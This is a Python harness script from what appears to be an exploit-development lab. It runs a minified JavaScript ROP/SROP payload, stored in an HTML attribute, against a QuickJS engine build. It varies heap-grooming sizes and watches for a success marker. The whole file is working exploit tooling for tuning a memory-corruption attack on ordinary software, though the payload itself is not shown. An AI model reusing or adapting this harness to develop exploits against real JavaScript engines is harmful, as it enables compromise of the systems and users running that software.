#!/usr/bin/env python3
"""Host matrix for the terser-minified attribute ROP final (pre-heap 5,752)."""
import json, os, re, subprocess, sys
HERE=os.path.dirname(os.path.abspath(__file__)); LAB=os.path.dirname(HERE); PAY=os.path.join(LAB,'payload')
P=open(os.path.join(PAY,'srop_host_terser.js')).read()
def run(H):
    html=open(os.path.join(PAY,f'at_rop_min_h{H}_host.html')).read(); a=re.findall(r'<script>(.*?)</script>',html,re.S)[0]
    d=('var HTMLPRE="A"+("a".repeat(5751));globalThis.HTMLPRE=HTMLPRE;\n'
       'var __v={textContent:""};\n'
       'globalThis.document={getElementById:function(id){if(id==="v")return __v;if(id==="s2")return {getAttribute:function(n){return '+json.dumps(P)+';}};return null;}};\n'
       +a+'\nglobalThis.RESULT="DRIVER "+globalThis.RESULT+" V="+__v.textContent;\n')
    open('/tmp/opencode/at_min_driver.js','w').write(d)
    p=subprocess.run(['/tmp/opencode/qjs017/build/app_multi','/tmp/opencode/at_min_driver.js'],capture_output=True,text=True,env={**os.environ,'QJS_HEAP_LIMIT':'8388608'})
    txt=p.stderr+p.stdout; m=re.search(r'(LS C=34[^\n]*)',txt)
    return p.returncode,m.group(1) if m else 'NO_RESULT'
for H in [int(x) for x in sys.argv[1:]] or [200,150,250,100,300,400,500,600,0]:
    rc,res=run(H); print(f'H={H} rc={rc} {res}')
